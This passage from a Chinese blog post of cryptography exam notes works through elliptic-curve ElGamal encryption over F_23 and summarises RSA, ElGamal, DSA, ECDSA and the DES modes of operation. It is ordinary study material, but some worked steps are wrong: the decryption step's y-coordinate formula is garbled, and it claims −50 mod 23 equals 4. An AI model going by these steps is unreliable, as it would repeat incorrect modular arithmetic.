<li><p>先计算 $ 2 \cdot (7, 12) $：<br>设 $ Q = (7, 12) $，首先计算斜率 $ \lambda $：<br>$ \lambda = \frac{3x_1^2 + a}{2y_1} \mod 23 $<br>其中 $ a = 1 $， $ Q = (x_1, y_1) = (7, 12) $，<br>$ \lambda = \frac{3(7)^2 + 1}{2(12)} \mod 23 = \frac{3 \cdot 49 + 1}{24} \mod 23 = \frac{148}{24} \mod 23 $<br>首先计算 $ 148 \mod 23 $：<br>$ 148 \mod 23 = 10 $<br>接下来计算 $ \frac{10}{24} \mod 23 $ ，可以通过计算 $ 24 $ 在模 $ 23 $ 下的逆元：<br>$ 24^{-1} \mod 23 = 1 $<br>因为 $ 24 \cdot 1 = 24 \equiv 1 \mod 23 $，所以 $ 24^{-1} = 1 $。<br>$ \frac{10}{24} \equiv 10 \cdot 24^{-1} \mod 23 = 10 \cdot 1 \mod 23 = 10 \mod 23 = 10 $<br>所以 $ \lambda = 10 $。</p>
</li>
<li><p>计算 $ (2x_1, 2y_1) $：<br>$ x_2 = \lambda^2 - 2x_1 \mod 23 = 10^2 - 2 \cdot 7 \mod 23 = 100 - 14 \mod 23 = 86 \mod 23 = 17 $<br>$ y_2 = \lambda (x_1 - x_2) - y_1 \mod 23 = 10(7 - 17) - 12 \mod 23 = 10(-10) - 12 \mod 23 = -100 - 12 \mod 23 = -112 \mod 23 = 3 $<br>所以 $ 2 \cdot (7, 12) = (17, 3) $。</p>
</li>
</ul>
<p>因此 $ k \cdot b = 2 \cdot (7, 12) = (17, 3) $。</p>
</li>
<li><p><strong>计算密文 $ c = (k \cdot g, m + k \cdot b) $ ：</strong><br>$ c_1 = k \cdot g = (13, 7) $<br>$ c_2 = m + k \cdot b = (5, 4) + (17, 3) $</p>
<p>点加法公式：<br>设 $ P = (x_1, y_1) $ 和 $ Q = (x_2, y_2) $，<br>斜率 $ \lambda = \frac{y_2 - y_1}{x_2 - x_1} \mod 23 $<br>$ x_3 = \lambda^2 - x_1 - x_2 \mod 23 $<br>$ y_3 = \lambda (x_1 - x_3) - y_1 \mod 23 $</p>
<p>计算：<br>$ \lambda = \frac{3 - 4}{17 - 5} \mod 23 = \frac{-1}{12} \mod 23 = 22 \cdot 2 \mod 23 =21$<br>所以 $ \lambda = 21 $。</p>
<p>$ x_3 = 21^2 - 5 - 17 \mod 23 = 441 - 22 \mod 23 = 419 \mod 23 = 5 $<br>$ y_3 = 21(5 - 5) - 4 \mod 23 = 0 - 4 \mod 23 = -4 \mod 23 = 19 $</p>
<p>所以 $ m + k \cdot b = (5, 19) $。</p>
<p>因此，密文 $ c = (k \cdot g, m + k \cdot b) = ((13, 7), (5, 19)) $。</p>
</li>
</ol>
<h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h5><p>接收者使用私钥 $ a = 3 $ 解密密文 $ c = ((13, 7), (5, 19)) $。</p>
<ol>
<li><p><strong>计算 $ a \cdot c_1 $：</strong><br>$ a \cdot c_1 = 3 \cdot (13, 7) $</p>
</li>
<li><p><strong>计算点倍乘 $ 3 \cdot (13, 7) $：</strong></p>
<p>使用椭圆曲线上的点倍乘公式：</p>
<ul>
<li><p>先计算 $ 2 \cdot (13, 7) $：<br>$ \lambda = \frac{3(13)^2 + 1}{2(7)} \mod 23 = \frac{3 \cdot 169 + 1}{14} \mod 23 = \frac{508}{14} \mod 23 $<br>首先计算 $ 508 \mod 23 $：<br>$ 508 \mod 23 = 2 $<br>接下来计算 $ \frac{2}{14} \mod 23 $ ，可以通过计算 $ 14 $ 在模 $ 23 $ 下的逆元：<br>$ 14^{-1} \mod 23 = 5 $<br>因为 $ 14 \cdot 5 = 70 \equiv 1 \mod 23 $，所以 $ 14^{-1} = 5 $。<br>$ \frac{2}{14} \equiv 2 \cdot 14^{-1} \mod 23 = 2 \cdot 5 \mod 23 = 10 $<br>所以 $ \lambda = 10 $。</p>
</li>
<li><p>计算 $ (2x_1, 2y_1) $：<br>$ x_2 = \lambda^2 - 2x_1 \mod 23 = 10^2 - 2 \cdot 13 \mod 23 = 100 - 26 \mod 23 = 74 \mod 23 = 5 $<br>$ y_2 = \lambda (x_1 - x_2) - y_1 \mod 23 = 10(13 - 5) - 7 \mod 23 = 10 \cdot 8 - 7 \mod 23 = 80 - 7 \mod 23 = 73 \mod 23 = 4 $<br>所以 $ 2 \cdot (13, 7) = (5, 4) $。</p>
</li>
<li><p>计算 $ 3 \cdot (13, 7) $:<br>使用上一步计算得到的 $ 2 \cdot (13, 7) = (5, 4) $，再计算 $ (5, 4) + (13, 7) $：<br>$ \lambda = \frac{7 - 4}{13 - 5} \mod 23 = \frac{3}{8} \mod 23 = 3 \cdot 8^{-1} \mod 23 $<br>计算 $ 8^{-1} \mod 23 $:<br>使用扩展欧几里得算法，得到 $ 8^{-1} \mod 23 = 3 $。<br>因为 $ 8 \cdot 3 = 24 \equiv 1 \mod 23 $，所以 $ 8^{-1} = 3 $。<br>$ \lambda = 3 \cdot 3 \mod 23 = 9 \mod 23 = 9 $<br>所以 $ \lambda = 9 $。</p>
</li>
<li><p>计算 $ (x_3, y_3) $：<br>$ x_3 = 9^2 - 5 - 13 \mod 23 = 81 - 18 \mod 23 = 17 $<br>$ y_3 = 9(5 - 17) - 4 \mod 23 = 9\cdot(-12) - 4 \mod 23 = 3 $</p>
<p>所以 $ 3 \cdot (13, 7) = (17, 3) $。</p>
</li>
</ul>
</li>
<li><p><strong>计算 $ m = c_2 - a \cdot c_1 $ ：</strong><br>$ m = (5, 19) - (17, 3) $</p>
<p>使用点减法公式：</p>
<ul>
<li>点减法可以表示为点加法 $ (5, 19) + (17, -3)=(5, 19) + (17, 20) $。</li>
</ul>
<p>计算斜率 $ \lambda $：<br>$ \lambda = \frac{20 - 19}{17 - 5} \mod 23 = \frac{1}{12} \mod 23 = \frac{1}{12} \mod 23 $</p>
<p>计算 $ 12^{-1} \mod 23 $:<br>使用扩展欧几里得算法，得到 $ 12^{-1} \mod 23 = 2 $。<br>因为 $ 12 \cdot 2 = 24 \equiv 1 \mod 23 $，所以 $ 12^{-1} = 2 $。<br>$ \lambda = 1 \cdot 2 \mod 23 = 2 \mod 23 = 2 $</p>
<p>计算 $ x_3 $ 和 $ y_3 $：<br>$ x_3 = 2^2 - 5 - 17 \mod 23 = 4 - 22 \mod 23 = -18 \mod 23 = 5 $<br>$ y_3 = 2(5 - 19) - 22 \mod 23 = 2 \cdot (-14) - 22 \mod 23 = -50 \mod 23  = 4 $</p>
<p>所以 $ (5, 19) - (17, 3) = (5, 4) $。</p>
</li>
</ol>
<p>解密得到的明文 $ m = (5, 4) $。</p>
<h4 id="考虑有限域-F-23-上的椭圆曲线E：-y-text-2-x-text-3-4x-1-令-P-left-4-text-7-right-Q-left-10-text-31-right-求-1-P-Q-2-2P。"><a href="#考虑有限域-F-23-上的椭圆曲线E：-y-text-2-x-text-3-4x-1-令-P-left-4-text-7-right-Q-left-10-text-31-right-求-1-P-Q-2-2P。" class="headerlink" title="考虑有限域 $F_{23}$上的椭圆曲线E： $y{}^\text{2}=x{}^\text{3}-4x+1,$令$P=\left( 4\text{,}7 \right),Q=\left( 10\text{,}31 \right)$ 求: (1) P+Q;  (2) 2P。"></a>考虑有限域 $F_{23}$上的椭圆曲线E： $y{}^\text{2}=x{}^\text{3}-4x+1,$令$P=\left( 4\text{,}7 \right),Q=\left( 10\text{,}31 \right)$ 求: (1) P+Q;  (2) 2P。</h4><p>我们需要在给定的椭圆曲线上进行点的加法和倍乘运算。椭圆曲线为 $ E: y^2 = x^3 - 4x + 1 $ ，有限域 $ F $ 上的点 $ P = (4, 7) $ 和 $ Q = (10, 31) $。</p>
<h5 id="1-计算-P-Q"><a href="#1-计算-P-Q" class="headerlink" title="(1) 计算 $ P + Q $"></a>(1) 计算 $ P + Q $</h5><p>首先，计算 $ \lambda $ ，即过 $ P $ 和 $ Q $ 的直线的斜率：</p>
<p>$ \lambda = \frac{y_2 - y_1}{x_2 - x_1} = \frac{31 - 7}{10 - 4} \mod 23= \frac{24}{6} \mod 23= 1\cdot 4 \mod23 =4$</p>
<p>计算 $ x_3 $ 和 $ y_3 $：</p>
<p>$ x_3 = \lambda^2 - x_1 - x_2 = 4^2 - 4 - 10 \mod23 = 16 - 4 - 10 \mod23 = 2 \mod23$</p>
<p>$ y_3 = \lambda(x_1 - x_3) - y_1 = 4(4 - 2) - 7 \mod23= 4 \cdot 2 - 7 \mod23= 8 - 7 \mod23= 1 \mod23$</p>
<p>因此，$ P + Q = (2, 1) $。</p>
<h5 id="2-计算-2P"><a href="#2-计算-2P" class="headerlink" title="(2) 计算 $ 2P $"></a>(2) 计算 $ 2P $</h5><p>首先，计算 $ \lambda $ ，即过 $ P $ 点的切线的斜率：</p>
<p>$ \lambda = \frac{3x_1^2 + a}{2y_1} $<br>其中 $ a = -4 $， $ P = (4, 7) $，</p>
<p>$ \lambda = \frac{3 \cdot 4^2 - 4}{2 \cdot 7} \mod23= \frac{3 \cdot 16 - 4}{14} \mod23= \frac{48 - 4}{14} \mod23= \frac{44}{14}\mod23 =21 \cdot 5 \mod23 = 13$</p>
<p>因此：</p>
<p>$ \lambda = 13 $</p>
<p>计算 $ x_3 $ 和 $ y_3 $：</p>
<p>$ x_3 = \lambda^2 - 2x_1 = 13^2 - 2 \cdot 4 \mod23= 169 - 8 \mod23= 0 $</p>
<p>$ y_3 = \lambda(x_1 - x_3) - y_1 = 13(4 + 0) - 7 \mod23= 52 - 7 \mod23= 45 \mod23= 22 $</p>
<p>因此，$ 2P = (0, 22) $。</p>
<p>所以：</p>
<ol>
<li>$ P + Q = (2, 1) $</li>
<li>$ 2P = (0, 22) $</li>
</ol>
<h5 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h5><p>椭圆曲线密码学（ECC）是一种基于椭圆曲线数学结构的公钥密码系统。以下是椭圆曲线加密和解密的公式和步骤：</p>
<p>基本概念和符号</p>
<ol>
<li><strong>椭圆曲线方程</strong>：常见形式为 $ E: y^2 = x^3 + ax + b $。</li>
<li><strong>有限域 $ F_p $</strong>：在有限域上的椭圆曲线，所有的计算都在模 $ p $ 的情况下进行。</li>
<li><strong>基点 $ G $</strong>：一个预先选定的曲线上非零点。</li>
<li><strong>私钥 $ d $</strong>：一个随机选定的整数，范围是 $ [1, n-1] $，其中 $ n $ 是 $ G $ 的阶。</li>
<li><strong>公钥 $ Q $</strong>：通过 $ Q = dG $ 计算得到。</li>
</ol>
<h6 id="椭圆曲线加密"><a href="#椭圆曲线加密" class="headerlink" title="椭圆曲线加密"></a>椭圆曲线加密</h6><p>加密过程涉及到明文点 $ M $，需要将其映射到椭圆曲线上，并使用接收者的公钥进行加密。加密的步骤如下：</p>
<ol>
<li><strong>随机选择一个整数 $ k $</strong>，范围是 $ [1, n-1] $。</li>
<li><strong>计算点 $ C_1 = kG $</strong>。</li>
<li><strong>计算点 $ C_2 = M + kQ $</strong>，其中 $ Q $ 是接收者的公钥。</li>
<li><strong>密文为 $ (C_1, C_2) $</strong>。</li>
</ol>
<p>具体公式为：<br>$ C_1 = kG $<br>$ C_2 = M + kQ $</p>
<h6 id="椭圆曲线解密"><a href="#椭圆曲线解密" class="headerlink" title="椭圆曲线解密"></a>椭圆曲线解密</h6><p>解密过程使用接收者的私钥 $ d $ 来恢复明文点 $ M $。解密的步骤如下：</p>
<ol>
<li><strong>接收密文 $ (C_1, C_2) $</strong>。</li>
<li><strong>计算点 $ dC_1 $</strong>，其中 $ d $ 是接收者的私钥。</li>
<li><strong>计算点 $ M = C_2 - dC_1 $</strong>。</li>
</ol>
<p>具体公式为：<br>$ dC_1 = d(kG) = k(dG) = kQ $<br>$ M = C_2 - kQ $</p>
<h6 id="详细的计算示例"><a href="#详细的计算示例" class="headerlink" title="详细的计算示例"></a>详细的计算示例</h6><p>假设有一个椭圆曲线 $ E: y^2 = x^3 + ax + b $ ，有限域 $ F_p $ 上的基点 $ G $，私钥 $ d $ 和公钥 $ Q = dG $，以及明文点 $ M $。</p>
<p>加密过程</p>
<ol>
<li><p><strong>选择随机数 $ k $</strong>：<br>$ k = 2 $</p>
</li>
<li><p><strong>计算 $ C_1 $</strong>：<br>$ C_1 = kG = 2G $</p>
</li>
<li><p><strong>计算 $ C_2 $</strong>：<br>$ C_2 = M + kQ $<br>其中 $ Q = dG $，假设 $ d = 3 $，那么 $ Q = 3G $，则 $ kQ = 2 \cdot 3G = 6G $。</p>
</li>
<li><p><strong>密文为 $ (C_1, C_2) $</strong>：<br>$ (C_1, C_2) = (2G, M + 6G) $</p>
</li>
</ol>
<p>解密过程</p>
<ol>
<li><p><strong>接收密文 $ (C_1, C_2) $</strong>：<br>$ (C_1, C_2) = (2G, M + 6G) $</p>
</li>
<li><p><strong>计算 $ dC_1 $</strong>：<br>$ dC_1 = 3 \cdot 2G = 6G $</p>
</li>
<li><p><strong>恢复明文 $ M $</strong>：<br>$ M = C_2 - dC_1 = (M + 6G) - 6G = M $</p>
</li>
</ol>
<h6 id="具体公式说明"><a href="#具体公式说明" class="headerlink" title="具体公式说明"></a>具体公式说明</h6><ul>
<li><p><strong>点加法</strong>：<br>若 $ P = (x_1, y_1) $ 和 $ Q = (x_2, y_2) $ 是椭圆曲线上的两个点，且 $ P \neq Q $，则 $ P + Q = (x_3, y_3) $ 的计算公式为：<br>$\lambda = \frac{y_2 - y_1}{x_2 - x_1} \mod p$<br>$x_3 = \lambda^2 - x_1 - x_2 \mod p$<br>$y_3 = \lambda(x_1 - x_3) - y_1 \mod p$</p>
<p><strong>点倍乘</strong>：<br>若 $ P = (x_1, y_1) $ 是椭圆曲线上的一个点，则 $ 2P = (x_3, y_3) $ 的计算公式为：<br>$ \lambda = \frac{3x_1^2 + a}{2y_1} \mod p $<br>$ x_3 = \lambda^2 - 2x_1 \mod p $<br>$ y_3 = \lambda(x_1 - x_3) - y_1 \mod p $</p>
</li>
</ul>
<p>这些公式和步骤适用于任何给定的椭圆曲线和有限域，并通过实际计算实现加密和解密过程。</p>
<h3 id="数字签名的公式分类整理"><a href="#数字签名的公式分类整理" class="headerlink" title="数字签名的公式分类整理"></a>数字签名的公式分类整理</h3><h4 id="RSA-数字签名算法"><a href="#RSA-数字签名算法" class="headerlink" title="RSA 数字签名算法"></a>RSA 数字签名算法</h4><ol>
<li><p><strong>RSA 签名方案</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选择两个大素数 $ p $ 和 $ q $</li>
<li>计算 $ n = pq $</li>
<li>计算 $ \phi(n) = (p-1)(q-1) $</li>
<li>选择一个整数 $ e $（满足 $ 1 &lt; e &lt; \phi(n) $ 且 $ \gcd(e, \phi(n)) = 1 $）</li>
<li>计算私钥 $ d $（满足 $ ed \equiv 1 \pmod{\phi(n)} $）</li>
<li>公钥为 $ (e, n) $，私钥为 $ (d, n) $</li>
</ul>
</li>
<li><p><strong>签名</strong>:</p>
<ul>
<li>对消息 $ m $ 进行哈希得到消息摘要 $ H(m) $</li>
<li>计算签名 $ s = H(m)^d \mod n $</li>
</ul>
</li>
<li><p><strong>验证</strong>:</p>
<ul>
<li>对签名 $ s $ 进行验证计算 $ H(m) $ 的哈希值： $ v = s^e \mod n $</li>
<li>若 $ v \equiv H(m) \mod n $，则验证通过</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="离散对数（基于离散对数问题的签名算法）"><a href="#离散对数（基于离散对数问题的签名算法）" class="headerlink" title="离散对数（基于离散对数问题的签名算法）"></a>离散对数（基于离散对数问题的签名算法）</h4><ol>
<li><p><strong>ElGamal签名方案</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选定大素数 $ p $ 和生成元 $ g $</li>
<li>选择私钥 $ x $（随机数），计算公钥 $ y = g^x \mod p $</li>
</ul>
</li>
<li><p><strong>签名</strong>:</p>
<ul>
<li>选择一个随机数 $ k $（满足 $ 1 &lt; k &lt; p-1 $ 且 $ \gcd(k, p-1) = 1 $）</li>
<li>计算 $ r = g^k \mod p $</li>
<li>计算 $ s = k^{-1}(H(m) - xr) \mod (p-1) $</li>
<li>签名为 $ (r, s) $</li>
</ul>
</li>
<li><p><strong>验证</strong>:</p>
<ul>
<li>计算 $ v_1 = y^r r^s \mod p $</li>
<li>计算 $ v_2 = g^{H(m)} \mod p $</li>
<li>若 $ v_1 \equiv v_2 \mod p $，则验证通过</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>DSA（数字签名算法）</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选定大素数 $ p $ 和生成元 $ g $</li>
<li>选定一个160位素数 $ q $（满足 $ q | (p-1) $）</li>
<li>选择私钥 $ x $（随机数），计算公钥 $ y = g^x \mod p $</li>
</ul>
</li>
<li><p><strong>签名</strong>:</p>
<ul>
<li>选择一个随机数 $ k $（满足 $ 1 &lt; k &lt; q $ 且 $ \gcd(k, q) = 1 $）</li>
<li>计算 $ r = (g^k \mod p) \mod q $</li>
<li>计算 $ s = k^{-1}(H(m) + xr) \mod q $</li>
<li>签名为 $ (r, s) $</li>
</ul>
</li>
<li><p><strong>验证</strong>:</p>
<ul>
<li>计算 $ w = s^{-1} \mod q $</li>
<li>计算 $ u_1 = H(m)w \mod q $</li>
<li>计算 $ u_2 = rw \mod q $</li>
<li>计算 $ v = ((g^{u_1} y^{u_2}) \mod p) \mod q $</li>
<li>若 $ v \equiv r \mod q $，则验证通过</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="椭圆曲线（基于椭圆曲线离散对数问题的签名算法）"><a href="#椭圆曲线（基于椭圆曲线离散对数问题的签名算法）" class="headerlink" title="椭圆曲线（基于椭圆曲线离散对数问题的签名算法）"></a>椭圆曲线（基于椭圆曲线离散对数问题的签名算法）</h4><ol>
<li><p><strong>ECDSA（椭圆曲线数字签名算法）</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选定椭圆曲线参数 $ E $ 和基点 $ G $</li>
<li>选择私钥 $ d $（随机数），计算公钥 $ Q = dG $</li>
</ul>
</li>
<li><p><strong>签名</strong>:</p>
<ul>
<li>选择一个随机数 $ k $（满足 $ 1 &lt; k &lt; n $，$ n $ 是基点 $ G $ 的阶）</li>
<li>计算 $ R = kG $，取 $ r = R_x \mod n $（其中 $ R_x $ 是点 $ R $ 的 x 坐标）</li>
<li>计算 $ s = k^{-1}(H(m) + dr) \mod n $</li>
<li>签名为 $ (r, s) $</li>
</ul>
</li>
<li><p><strong>验证</strong>:</p>
<ul>
<li>验证 $ r, s $ 是否在有效范围内（$ 1 \leq r, s &lt; n $）</li>
<li>计算 $ w = s^{-1} \mod n $</li>
<li>计算 $ u_1 = H(m)w \mod n $</li>
<li>计算 $ u_2 = rw \mod n $</li>
<li>计算 $ P = u_1G + u_2Q $</li>
<li>取 $ v = P_x \mod n $（其中 $ P_x $ 是点 $ P $ 的 x 坐标）</li>
<li>若 $ v \equiv r \mod n $，则验证通过</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p><strong>RSA 数字签名算法</strong>:</p>
<ul>
<li>基于大整数分解难题，使用私钥进行签名，公钥进行验证。</li>
</ul>
</li>
<li><p><strong>离散对数问题</strong>:</p>
<ul>
<li>经典算法有 ElGamal 签名方案和 DSA。</li>
<li>基于离散对数问题，依赖于大素数的难解性。</li>
</ul>
</li>
<li><p><strong>椭圆曲线离散对数问题</strong>:</p>
<ul>
<li>经典算法有 ECDSA。</li>
<li>椭圆曲线提供了相同安全级别下更小的密钥尺寸。</li>
</ul>
</li>
</ul>
<h3 id="公钥加密的公式分类整理"><a href="#公钥加密的公式分类整理" class="headerlink" title="公钥加密的公式分类整理"></a>公钥加密的公式分类整理</h3><h4 id="RSA-公钥加密"><a href="#RSA-公钥加密" class="headerlink" title="RSA 公钥加密"></a>RSA 公钥加密</h4><ol>
<li><p><strong>RSA 加密方案</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选择两个大素数 $ p $ 和 $ q $</li>
<li>计算 $ n = pq $</li>
<li>计算 $ \phi(n) = (p-1)(q-1) $</li>
<li>选择一个整数 $ e $（满足 $ 1 &lt; e &lt; \phi(n) $ 且 $ \gcd(e, \phi(n)) = 1 $）</li>
<li>计算私钥 $ d $（满足 $ ed \equiv 1 \pmod{\phi(n)} $）</li>
<li>公钥为 $ (e, n) $，私钥为 $ (d, n) $</li>
</ul>
</li>
<li><p><strong>加密</strong>:</p>
<ul>
<li>明文 $ m $</li>
<li>密文 $ c = m^e \mod n $</li>
</ul>
</li>
<li><p><strong>解密</strong>:</p>
<ul>
<li>密文 $ c $</li>
<li>明文 $ m = c^d \mod n $</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="基于离散对数的公钥加密"><a href="#基于离散对数的公钥加密" class="headerlink" title="基于离散对数的公钥加密"></a>基于离散对数的公钥加密</h4><ol>
<li><p><strong>ElGamal 加密方案</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选定大素数 $ p $ 和生成元 $ g $</li>
<li>选择私钥 $ x $（随机数），计算公钥 $ y = g^x \mod p $</li>
<li>公钥为 $ (p, g, y) $，私钥为 $ x $</li>
</ul>
</li>
<li><p><strong>加密</strong>:</p>
<ul>
<li>明文 $ m $</li>
<li>选择随机数 $ k $（满足 $ 1 &lt; k &lt; p-1 $）</li>
<li>计算 $ c_1 = g^k \mod p $</li>
<li>计算 $ c_2 = m \cdot y^k \mod p $</li>
<li>密文为 $ (c_1, c_2) $</li>
</ul>
</li>
<li><p><strong>解密</strong>:</p>
<ul>
<li>密文 $ (c_1, c_2) $</li>
<li>计算 $ s = c_1^x \mod p $</li>
<li>计算明文 $ m = c_2 \cdot s^{-1} \mod p $</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="基于椭圆曲线离散对数的公钥加密"><a href="#基于椭圆曲线离散对数的公钥加密" class="headerlink" title="基于椭圆曲线离散对数的公钥加密"></a>基于椭圆曲线离散对数的公钥加密</h4><ol>
<li><p><strong>椭圆曲线 ElGamal 加密方案</strong></p>
<ul>
<li><p><strong>密钥生成</strong>:</p>
<ul>
<li>选定椭圆曲线 $ E $ 和基点 $ G $</li>
<li>选择私钥 $ d $（随机数），计算公钥 $ Q = dG $</li>
<li>公钥为 $ (E, G, Q) $，私钥为 $ d $</li>
</ul>
</li>
<li><p><strong>加密</strong>:</p>
<ul>
<li>明文点 $ P_m $</li>
<li>选择随机数 $ k $</li>
<li>计算 $ C_1 = kG $</li>
<li>计算 $ C_2 = P_m + kQ $</li>
<li>密文为 $ (C_1, C_2) $</li>
</ul>
</li>
<li><p><strong>解密</strong>:</p>
<ul>
<li>密文 $ (C_1, C_2) $</li>
<li>计算 $ P_m = C_2 - dC_1 $</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p><strong>RSA 公钥加密</strong>:</p>
<ul>
<li>基于大整数分解难题，公钥用于加密，私钥用于解密。</li>
</ul>
</li>
<li><p><strong>基于离散对数的公钥加密</strong>:</p>
<ul>
<li>ElGamal 加密方案基于离散对数问题，使用生成元和大素数进行加密和解密。</li>
</ul>
</li>
<li><p><strong>基于椭圆曲线离散对数的公钥加密</strong>:</p>
<ul>
<li>椭圆曲线 ElGamal 加密方案，使用椭圆曲线上的点和基点进行加密和解密。提供更高的安全性和效率。</li>
</ul>
</li>
</ul>
<h3 id="DES-的五种主要工作模式"><a href="#DES-的五种主要工作模式" class="headerlink" title="DES 的五种主要工作模式"></a>DES 的五种主要工作模式</h3><p>DES（数据加密标准）是一种对称加密算法，它可以在多种工作模式下使用。不同的工作模式提供了不同的安全特性和操作方式。以下是 DES 的五种主要工作模式：</p>
<h4 id="1-电子密码本模式（ECB，Electronic-Codebook）"><a href="#1-电子密码本模式（ECB，Electronic-Codebook）" class="headerlink" title="1.电子密码本模式（ECB，Electronic Codebook）"></a>1.电子密码本模式（ECB，Electronic Codebook）</h4><p><strong>工作原理</strong>：</p>
<ul>
<li>明文被分割成固定大小的块（通常是64位），每个块独立地加密或解密。</li>
<li>相同的明文块总是被加密成相同的密文块。</li>
</ul>
<p><strong>优点</strong>：</p>
<ul>
<li>实现简单，适合加密小数据量或无关数据。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>不提供数据的混淆和扩散效果。</li>
<li>相同的明文块总是被加密成相同的密文块，容易被攻击者利用模式分析攻击。</li>
</ul>
<p><strong>示例</strong>：</p>
<ul>
<li>适用于随机数据或少量数据的加密。</li>
</ul>
<h4 id="2-密文分组链接模式（CBC，Cipher-Block-Chaining）"><a href="#2-密文分组链接模式（CBC，Cipher-Block-Chaining）" class="headerlink" title="2. 密文分组链接模式（CBC，Cipher Block Chaining）"></a>2. 密文分组链接模式（CBC，Cipher Block Chaining）</h4><p><strong>工作原理</strong>：</p>
<ul>
<li>第一个明文块与初始向量（IV）进行异或，然后加密。</li>
<li>每个后续明文块在加密前与前一个密文块进行异或。</li>
</ul>
<p><strong>优点</strong>：</p>
<ul>
<li>提供了混淆和扩散效果。</li>
<li>相同的明文块不会加密成相同的密文块。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>需要初始向量（IV）。</li>
<li>加密和解密不能并行处理。</li>
</ul>
<p><strong>示例</strong>：</p>
<ul>
<li>广泛用于各种安全通信协议中，如 SSL/TLS。</li>
</ul>
<h4 id="3-密文反馈模式（CFB，Cipher-Feedback）"><a href="#3-密文反馈模式（CFB，Cipher-Feedback）" class="headerlink" title="3. 密文反馈模式（CFB，Cipher Feedback）"></a>3. 密文反馈模式（CFB，Cipher Feedback）</h4><p><strong>工作原理</strong>：</p>
<ul>
<li>类似于流密码，将块加密算法转换为流模式。</li>
<li>初始向量（IV）被加密，然后与明文块进行异或产生密文。</li>
<li>密文的一部分作为下一个块的输入进行加密。</li>
</ul>
<p><strong>优点</strong>：</p>
<ul>
<li>提供了混淆和扩散效果。</li>
<li>适用于加密长度不定的数据。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>需要初始向量（IV）。</li>
<li>加密和解密不能并行处理。</li>
</ul>
<p><strong>示例</strong>：</p>
<ul>
<li>适用于加密流数据或实时数据。</li>
</ul>
<h4 id="4-输出反馈模式（OFB，Output-Feedback）"><a href="#4-输出反馈模式（OFB，Output-Feedback）" class="headerlink" title="4. 输出反馈模式（OFB，Output Feedback）"></a>4. 输出反馈模式（OFB，Output Feedback）</h4><p><strong>工作原理</strong>：</p>
<ul>
<li>类似于流密码，将块加密算法转换为流模式。</li>
<li>初始向量（IV）被加密，然后加密的结果作为下一个块的输入进行加密。</li>
<li>每个加密的输出与明文块进行异或产生密文。</li>
</ul>
<p><strong>优点</strong>：</p>
<ul>
<li>提供了混淆和扩散效果。</li>
<li>适用于加密长度不定的数据。</li>
<li>加密输出不会传播错误。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>需要初始向量（IV）。</li>
<li>加密和解密不能并行处理。</li>
</ul>
<p><strong>示例</strong>：</p>
<ul>
<li>适用于加密流数据或实时数据。</li>
</ul>
<h4 id="5-计数器模式（CTR，Counter）"><a href="#5-计数器模式（CTR，Counter）" class="headerlink" title="5. 计数器模式（CTR，Counter）"></a>5. 计数器模式（CTR，Counter）</h4><p><strong>工作原理</strong>：</p>
<ul>
<li>类似于流密码，将块加密算法转换为流模式。</li>
<li>使用一个计数器值与初始向量（IV）结合作为输入，每次加密后计数器递增。</li>
<li>计数器的加密输出与明文块进行异或产生密文。</li>
</ul>
<p><strong>优点</strong>：</p>
<ul>
<li>提供了混淆和扩散效果。</li>
<li>支持并行加密和解密。</li>
<li>错误不会传播。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>需要初始向量（IV）和计数器值的管理。</li>
</ul>
<p><strong>示例</strong>：</p>
<ul>
<li>适用于高速网络加密和并行处理的数据加密。</li>
</ul>
<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>这五种工作模式各有优缺点，适用于不同的应用场景。选择合适的工作模式取决于具体的安全需求和操作环境。一般来说，CBC、CFB、OFB 和 CTR 模式提供了更高的安全性和灵活性，适用于大多数实际应用，而 ECB 模式由于其较弱的安全性，通常仅用于少量数据或无关数据的加密。</p>
<h3 id="期末重点"><a href="#期末重点" class="headerlink" title="期末重点"></a>期末重点</h3><img src="/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/4bc0b93131f478f73c2e23d61bf0213.png" class="" title="4bc0b93131f478f73c2e23d61bf0213">

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">实训记录</a>
